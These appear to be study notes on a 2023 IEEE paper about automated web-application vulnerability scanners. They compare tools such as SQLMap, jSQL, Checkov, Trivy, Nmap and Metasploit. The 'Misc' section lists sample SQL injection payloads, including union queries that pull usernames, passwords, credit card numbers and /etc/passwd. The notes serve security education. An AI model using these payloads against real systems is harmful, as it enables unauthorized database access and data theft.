# Scanning of Web-Applications: Algorithms and Software for Search of Vulnerabilities “Code Injection” and “Insecure Design” (Sept 2023)

| Resources	|
|----------|
| [Database](https://doi-org.ezproxy.semo.edu:2443/10.1109/IDAACS58523.2023.10348918) |
| DOI: 10.1109/IDAACS58523.2023.10348918 |
| [PDF](https://ieeexplore-ieee-org.ezproxy.semo.edu:2443/stamp/stamp.jsp?tp=&arnumber=10348918) 	|

----

### Goal: analyze existing algorithms and software capable of automatically scanning web applications

**Goal 1:** Analysis of algorithms and software tools for scanning web applications with the aim of detecting vulnerabilities according to OWASP top 10

**Goal 2:** Overview of existing vulnerabilities in web applications

**Goal 3:** Main approaches and methods used for their detection

<br>

### Additional Notes

**Exploitable:**
- incorrect/insecure programming

**Created a script to detect SQL injection vulnerabilities**
- Could not gain unauthorized access or attacksystem


<br>

----

<br>

<a id="approach"></a>
## Approach

**Vulnerability Scanner Types:**
- [Static scanners](#static-scanner)
	Tend to produce higher number of false positives
-  [Dynamic scanners](#dynamic-scanner)
	Takes more time
	
<br>

<a id="tools"></a>
## Tools

**Dictionary Search Tools:**
- [SQLMap](#sqlmap): SQL injection vulnerability automated detection
- [Blisqy](#blisqy): Find and exploiting Time-based Blind SQL injection vulnerabilities in HTTP headers
- [jSQL Injection](#jsql-injection): Detect and exploit SQL injection vulnerabilities in web applications that use SQL databases

**Insecure Design Tool**
- [Checkov](#checkov): 
- [Trivy](#trivy): 
- [Snyk](#snyk): 
- [Nmap](#nmap): 
- [Metasploit Framework](#metasploit-framework): 


<br>

<a id="equipment"></a>
## Equipment (ex: Raspberry Pi)  

Damn Vulnerable Web Application (DVWA)

<br>

<a id="methods"></a>
## Methods

**Attacks:**
- XSS-attacks
- SQL injections 
- NoSQL injections
- Blind SQL injections
- LDAP injections

<br>

**Vulnerability Search Schemes (Code Injection):**
- [Dictionary](#dictionary-scheme)
	- [Error-based](#error-based)
	- [Union-based](#union-based)
	- [Time-based](#time-based)

<br>

----

## Misc

<a id="dynamic-scanner"></a>
**Dynamic Scanners (Vulnerability Scanner Type):**
	- where access to the application or infrastructure source code is not available
	- Example: network scanner (Nmap suggested)

<br>

<a id="static-scanner"></a>
**Static scanners (Vulnerability Scanner Type):**
	- use if infrastructure built using infrastructure as code (IaC) tools
	- Examples: Checkov, Trivy, and Snyk

<br>

<a id="dictionary-scheme"></a>
**Dictionary** (Code Injection Vuln. Search Scheme):
	
	Purpose: identify typical vulnerabilities in web applications and databases that lack proper protection or sanitization
	
	Exploits by: attempting to inject known malicious code or payloads from a predefined dictionary into the target application or database to identify if there is a vulnerability
	
	Methods:
		- Error-based
		- Time-based injection
		- Union-based
		- Boolean-based
		
<br>

<a id="time-based"></a>
**Time-Based (Dictionary Scheme Method):**

	Definition: analyzing the time, it takes for the web application to process and respond to these queries
	
	Goal: determine the existence of a vulnerability in a web application by observing the delay in the response
	
	Provides: 

	Example query:
	
	'OR SLEEP(5) --
	'AND IF(1=1, SLEEP(5), NULL) –
	'AND IF(1=1, (SELECT SLEEP(5)), NULL) --
	'; SELECT CASE WHEN (1=1) THEN
	pg_sleep(5) ELSE NULL END; --
	'AND IF(1=1, SLEEP(5),
	BENCHMARK(1000000,MD5(1))) --
	'UNION ALL SELECT NULL, IF(1=1,
	(SELECT SLEEP(5)), NULL) --
	'UNION ALL SELECT NULL, IF(1=1,
	SLEEP(5), BENCHMARK(1000000,MD5(1)))
	--

<br>

<a id="error-based"></a>
**Error-Based (Dictionary Scheme Method):**

	Definition: injecting specially crafted input (Ex: specific characters or SQL statements)
	
	Goal: trigger an error response from the database
	
	Provides: additional information that can be useful for further attacks or understanding the structure of the database. 

	Example query: 
	
		'OR 1=1/0 --
		'OR 'abc'='abc' AND 1=1/0 --
		'; EXEC non_existent_procedure; --
		'UNION ALL SELECT 1, @@VERSION –
		'OR (SELECT COUNT(*) FROM
		information_schema.tables) = 0 --
		'OR ROW(1,1)>(SELECT
		COUNT(*),CONCAT(CHAR(58,58,58),
		version(), CHAR(58,58,58))x FROM
		information_schema.tables GROUP BY x) --
		'AND (SELECT TOP 1 column_name FROM
		information_schema.columns) = 'username' -- 

<br>

<a id="union-based"></a>
**Union-based (Dictionary Scheme Method):**

	Definition: leveraging the UNION operator in SQL queries to combine the results of multiple SELECT statements

	Goal: accessing unauthorized data or bypassing authentication mechanisms

	Provides: additional information from the database
	
	Example Query:
	
		'UNION SELECT null --
		'UNION SELECT column_name FROM
		information_schema.columns --
		' UNION SELECT username FROM users --
		'UNION SELECT password FROM users
		WHERE username='admin' --
		'UNION SELECT credit_card_number FROM
		customers --
		'UNION SELECT NULL, CONCAT(username,
		':', password) FROM users --
		'UNION SELECT LOAD_FILE('/etc/passwd') --

<br>

<a id="sqlmap"></a>
**SQLMap (Dictionary Search Tool):**

	Reference Page: https://sqlmap.org
	
	Purpose: detection of SQL injection vulnerabilities
	
	Pros: 
		- Automated
		- Most popular compared to counterparts
		- Does not require attacker to have in-depth knowledge
		- Can be done even if authentication is required (since capable of working with cookies)
		- bypass firewall in search of SQL injection vuln (by generating random user-agent client strings
	
	Additional Notes:
		
		
		Types of Vulnerabilities Detected:
			- Error-Based Injection
			- Time-Based Injection
			- Boolean-Based Injection
			- Union-Based Injection
			- Command Injection
		
<br>

<a id="blisqy"></a>
**Blisqy (Dictionary Search Tool):**

	Reference Page: https://www.hackingloops.com/penetration-testing-forblind-sql-injection-using-bbqsql)
	
	Purpose: finding and exploiting Time-based Blind SQL injection vulnerabilities in HTTP headers
		
	Pros: 
		- Customizable 
		- user-friendly interface
		- advanced detection algorithms
		- Identify potential points of exploitation
			- By: thoroughly analyzing app inputs and behaviors
		- Exploitation features (can gain unauthorized access to database and manipulate data)
		- Users don't need extensive knowledge of IS
		- Supports: Error-Based, Time-Based, Boolean-Based, Union-Based, and Stacked Queries SQL injection techniques
	
	Cons:
		- Only supports MySQL/MariaDB
		- May not support cookie handling (when authentication is required)
	
	Additional Notes:
		- Modules provided can be imported into other Python-based scripts, allowing users to create their own scripts for specific penetration testing tasks
		- Uses blind SQL injection
		- Exploits by: slow extraction of data from a database
		
<br>

<a id="jsql-injection"></a>
**jSQL Injection (Dictionary Search Tool):**

	Reference Page: https://www.kali.org/tools/jsql
	
	Purpose: Detecting and exploiting SQL injection vulnerabilities in web applications that use SQL databases
		
	Pros: 
		- Open-source 
		- User-friendly graphical interface
		- Automate injection attacks and exploits
		- Doesn't require additional IS knowledge
		- Supports: Error-Based, Time-Based, and Blind-Based scans
		- Features:
			- Automated Enumeration and Cloning Attacks
			- Scanning Subnets and IP Lists
			- Password Cracking
			- JavaScript Injection Techniques
			- Timing-Based Attacks
	
	Cons: 
	- lacks settings beyond choosing available scan type and vulnerable payload
	- Doesn't support use of cookies
	
	Additional Notes:
		- Range of features to automate injection attacks and exploit default configuration weaknesses in databases.
		- exploits time delays in responses to infer the success or failure of injected code

<br>


<a id="checkov"></a>
**Checkov (Insecure Design Tool):**

	Reference Page:  https://www.checkov.io/1.Welcome/Quick%20Start.html
	
	Purpose: Identify and prevent security misconfigurations in cloud environments
		
	Pros: 
		- Open-source
		- Built-in support for popular integrated development environments (IDEs) (Ex: Visual Studio Code and JetBrains IDEs)
		- Provides support for CI/CD (for free systems & proprietary resources)
		- Supports AWS CodePipeline and AWS CodeBuild
	
	Additional Notes:
		- Static analysis tool 
		
		Main focus: scanning IaC templates written in popular formats such as Terraform, AWS CloudFormation, and Kubernetes YAML files
		
		Designed for: infrastructure as code (IaC) security
<br>

<a id="trivy"></a>
**Trivy (Insecure Design Tool):**

	Reference Page:  https://aquasecurity.github.io/trivy/v0.19.2
	
	Purpose: Vulnerability Scanner - identifying security vulnerabilities in container images and helps ensure that containers are free from known vulnerabilities before deployment
		
	Provides: detailed reports on vulnerabilities found
	
	Pros: 
		- Open-source
		- Container-focused approach
		- useful in securing containerized environments
		- useful in ensuring the integrity of container images used in deployment pipelines. 
	
	Additional Notes:
		- static-scanner
		- for containerized environments
		- analyzes the layers and dependencies within the container image to identify potential security issues

<br>

<a id="snyk"></a>
**Snyk (Insecure Design Tool):**

	Reference Page: https://security.snyk.io
	
	Purpose: in containers and infrastructure configurations as code (IaC):
		- Scan and prioritize information security
		- Detect vulnerabilities in modules hosted and/or not hosted in a tested repository
		- Identify vulnerabilities
		
	Pros: 
		- Free access
		- Works with popular programming languages (use for web app development)
		
	Cons:
		- Free access has limited scanning capabilities
	
	Additional Notes:
		- Enterprise solution
		- List of supported languages found at: https://docs.snyk.io/introducing-snyk/snyk-languages-and-integrations
		- Application example: statistical analysis
<br>

<a id="nmap"></a>
**Nmap (Insecure Design Tool):**

	Reference Page: https://nmap.org
	
	Purpose: Network Scanning 
		
		(to conduct reconnaissance on the internal network of a web application in order to have an understanding of the target and identify its vulnerabilities before an attack)

	Additional Notes:
		- Can integrate Nmap into the CI/CD cycle
		- Nmap already has access to the internal network by default
		- can be performed after setting up the internal infrastructure of the web application -- to ensure that components of the web application that should not have public access to the internet (e.g. database server do not have privileged access)
		
		Useful for:
			- Security Auditing
			- Regular network management task (e.g. network exploration, service and schedule monitoring, and host or service uptime tracking)
		
<br>

<a id="metasploit-framework"></a>
**Metasploit Framework (Insecure Design Tool):**

	Reference Page: https://www.metasploit.com
	
	Purpose:  penetration testing platform that enables the discovery, exploitation, and validation of vulnerabilitie
		
	Provides: wide range of exploits, payloads, and auxiliary modules that can be used to test and validate vulnerabilities in target systems

	Pros: 
		- Command-line and web-based interface
		- Allows users to leverage collection of known exploits and techniques
	Cons:
		- Have to be careful to comply with legal and ethical guidelines (only use with proper authorization and consent)
	
	Additional Notes:
		- includes anti-forensic and remediation tool
		- Some tools built into framework
		- Professionals can simulate real-world attacks to assess the security posture of systems and applications
		- useful for pen testing, vuln. assessment, and security research
		- Example of use: complete pentesting tool in cloud and locally
<br>

----

## Other Documents Referenced

**Architecture and model of neural network based service for choice of the penetration testing tools, International Journal of Computing (2021)** 

	A. Tetskyi, V. Kharchenko, D. Uzun, A. Nechausov,
	
